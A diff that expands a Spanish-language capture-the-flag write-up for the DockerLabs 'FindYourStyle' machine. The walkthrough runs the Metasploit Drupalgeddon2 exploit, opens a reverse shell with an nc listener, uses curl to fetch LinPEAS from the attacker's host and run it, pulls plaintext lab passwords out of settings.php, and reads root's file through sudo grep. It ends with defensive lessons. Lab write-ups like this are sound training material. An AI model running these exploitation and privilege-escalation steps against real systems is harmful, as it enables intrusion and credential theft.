@@ -1,75 +1,204 @@
-# FINDYOURSTYLE — DockerLabs
+# FindYourStyle — DockerLabs
 
 **Plataforma:** DockerLabs  
 **Dificultad:** 🟢 Fácil  
 **SO:** Linux  
+**Autor de la máquina:** El Pingüino de Mario  
+**Fecha de creación:** 16/10/2024  
+**Técnicas:** Nmap · Drupal 8 · Metasploit (Drupalgeddon2) · Reverse Shell · LinPEAS · Contraseña en settings.php · ls+grep/sudo
 
 ---
 
-## Resumen
+## Índice
 
-Resolución de la máquina **FINDYOURSTYLE** de DockerLabs.
+1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
+2. [Identificación de Drupal 8 y explotación con Metasploit](#2-identificación-de-drupal-8-y-explotación-con-metasploit)
+3. [Reverse Shell desde meterpreter](#3-reverse-shell-desde-meterpreter)
+4. [Movimiento lateral con LinPEAS — contraseña en settings.php](#4-movimiento-lateral-con-linpeas--contraseña-en-settingsphp)
+5. [Escalada de privilegios — ls y grep con sudo](#5-escalada-de-privilegios--ls-y-grep-con-sudo)
+6. [Lección aprendida](#6-lección-aprendida)
 
 ---
 
-## 1. Reconocimiento
+## 1. Despliegue y reconocimiento
 
-Vamos a desplegar la maquina vulnerable.
+```bash
+sudo bash auto_deploy.sh findyourstyle.tar
+```
 
-Vamos a hacer un escaneo profundo en la maquina para ver los puertos que tiene
-abiertos.
+> IP asignada: `172.17.0.2`.
 
-Vemos que solo cuenta con un servidor web, así que vamos a explorar la página,
-aunque en el escaneo ya nos dice que es un Drupal 8
+Escaneo completo:
 
-## 2. Enumeración
+```bash
+sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
+cat Puertos
+```
 
-De igual manera vamos a ver la versión de drupal para luego con metaesploit
-buscar una vulnerabilidad.
+```
+PORT   STATE SERVICE REASON
+80/tcp open  http    syn-ack ttl 64
+|_http-title: Welcome to Find your own Style
+|_http-generator: Drupal 8 (https://www.drupal.org)
+```
 
-Haremos la búsqueda y vemos que hay varias versiones con vulnerabilidades.
+Solo puerto 80. Nmap ya identifica directamente **Drupal 8** en las cabeceras.
 
-Ejecutando el exploit vemos que nos pide el host, así que lo escribiremos y luego
-ejecutaremos.
+---
 
-## 3. Explotación
+## 2. Identificación de Drupal 8 y explotación con Metasploit
 
-Una vez dentro haremos una reverse Shell para que sea más cómodo movernos.
+Visitamos `http://172.17.0.2` — CMS Drupal. Desde el `CHANGELOG.txt` o las cabeceras HTTP confirmamos la versión: **Drupal 8**.
 
-Lo primero que haremos será ver los usuarios, intentamos varias formas de
-escalar privilegios pero no encontramos ninguna forma, así que esta vez
-utilizaremos linpeas.
+Abrimos Metasploit y buscamos exploits disponibles:
 
-Desde nuestro host vamos a buscar donde lo tenemos instalado y lo
-compartiremos por un servidor con Python.
+```bash
+msfconsole
+msf6 > search Drupal 8
+```
 
-## 4. Post-explotación
+```
+#  Name                                                      Rank       Description
+0  exploit/unix/webapp/drupal_drupalgeddon2                  excellent  Drupal Drupalgeddon 2 Forms API Property Injection
+```
 
-Una vez descargado en la maquina víctima, vamos a darle permisos de ejecución y
-lo ejecutaremos.
+Cargamos el exploit y configuramos el objetivo:
 
-Después de que termine buscando hemos encontrado la contraseña que
-seguramente sea del usuario ballenita.
+```bash
+msf6 > use exploit/unix/webapp/drupal_drupalgeddon2
+msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set RHOSTS 172.17.0.2
+RHOSTS => 172.17.0.2
+msf6 exploit(unix/webapp/drupal_drupalgeddon2) > run
+```
 
-Nos logeamos con ese usuario y vemos que estamos dentro.
+```
+[*] Started reverse TCP handler on 192.168.1.26:4444
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target is vulnerable.
+```
 
-## 5. Escalada de privilegios
+> 💡 **Drupalgeddon2 (CVE-2018-7600)** es una vulnerabilidad crítica en el sistema de formularios de Drupal que permite RCE sin autenticación. Afecta a Drupal 6, 7 y 8 en versiones anteriores a los parches de abril 2018.
 
-Ahora haremos la escalada de privilegios de sudo.
+---
 
-Vemos que tenemos permisos con ls y grep así que listaremos a ver si
-encontramos algo en el directorio de root. Vemos que si así que ahora lo
-miraremos.
+## 3. Reverse Shell desde meterpreter
 
-Con ayuda de gtfobins vamos a ver como podemos listar esto.
+Desde la sesión meterpreter obtenida, lanzamos una shell interactiva y luego mejoramos a una reverse shell:
+
+```bash
+meterpreter > shell
+Process 27 created.
+Channel 0 created.
+whoami
+www-data
+```
+
+Preparamos nc en nuestro host y enviamos el payload Bash de revshells.com por el parámetro cmd para obtener una shell más cómoda:
+
+```bash
+sudo nc -lvnp 443
+```
+
+Una vez con shell estable, enumeramos el sistema:
+
+```bash
+www-data@befc2528fb17:/var/www/html$ cd /home && ls -la
+drwxr-xr-x 2 ballenita ballenita 4096 Oct 16 2024 ballenita
+```
+
+Un usuario: **ballenita**.
+
+---
+
+## 4. Movimiento lateral con LinPEAS — contraseña en settings.php
+
+No encontramos escalada directa por sudo o SUID. Usamos **LinPEAS** para enumeración automática.
+
+Desde nuestra máquina:
+
+```bash
+whereis linpeas
+# /usr/bin/linpeas
+python3 -m http.server 8000
+```
+
+En la víctima:
+
+```bash
+www-data@befc2528fb17:/var/www/html$ curl http://192.168.1.26:8000/linpeas.sh -O
+www-data@befc2528fb17:/var/www/html$ chmod +x linpeas.sh
+www-data@befc2528fb17:/var/www/html$ ./linpeas.sh
+```
+
+LinPEAS encuentra contraseñas en ficheros de configuración PHP:
+
+```
+Searching passwords in config PHP files
+/var/www/html/sites/default/settings.php: * 'password' => 'sqlpassword',
+/var/www/html/sites/default/settings.php: * 'password' => 'ballenitafeliz', //Cuidadito cuidadin pillin
+```
+
+Contraseña de ballenita: **ballenitafeliz**
+
+```bash
+www-data@befc2528fb17:/var/www/html$ su ballenita
+Password: ballenitafeliz
+ballenita@befc2528fb17:~$
+```
+
+---
+
+## 5. Escalada de privilegios — ls y grep con sudo
+
+```bash
+ballenita@befc2528fb17:~$ sudo -l
+```
+
+```
+User ballenita may run the following commands on befc2528fb17:
+    (root) NOPASSWD: /bin/ls, /bin/grep
+```
+
+`ls` con sudo para ver el directorio de root:
+
+```bash
+ballenita@befc2528fb17:~$ sudo /bin/ls /root/
+secretitomaximo.txt
+```
+
+`grep` con sudo para leer el fichero (GTFObins):
+
+```bash
+ballenita@befc2528fb17:~$ LFILE=/root/secretitomaximo.txt
+ballenita@befc2528fb17:~$ sudo /bin/grep '' $LFILE
+nobodycanfindthispasswordrootrocks
+```
+
+```bash
+ballenita@befc2528fb17:~$ su root
+Password: nobodycanfindthispasswordrootrocks
+root@befc2528fb17:/home/ballenita# whoami
+root
+```
+
+✅ Somos **root**.
+
+---
 
 ## 6. Lección aprendida
 
-Esta máquina enseña a encadenar técnicas de reconocimiento, enumeración y explotación para comprometer un sistema Linux y escalar hasta root.
+| Vulnerabilidad | Dónde | Impacto |
+|----------------|-------|---------|
+| **Drupal 8 sin parchear (Drupalgeddon2)** | Puerto 80 | RCE sin autenticación |
+| **Contraseña en settings.php de Drupal** | `/sites/default/settings.php` | Credencial SSH de ballenita |
+| **ls y grep con sudo** | Sudoers de ballenita | Lectura de ficheros de root |
 
-> 💡 **Consejo para principiantes:** Si te atascas, vuelve al paso de enumeración — casi siempre hay algo que no viste la primera vez.
+**Para defenderse:**
+- Mantener Drupal actualizado — Drupalgeddon2 tiene parche disponible desde abril 2018.
+- Las contraseñas en `settings.php` deben estar en variables de entorno, nunca en texto plano.
+- `ls` y `grep` con sudo permiten leer cualquier fichero del sistema. Nunca añadirlos al sudoers.
 
 ---
 
-*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs*  
+*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
 *¿Te ha ayudado? Dale una ⭐ al [repositorio](https://github.com/Caan31/Maquinas_DockerLabs)*
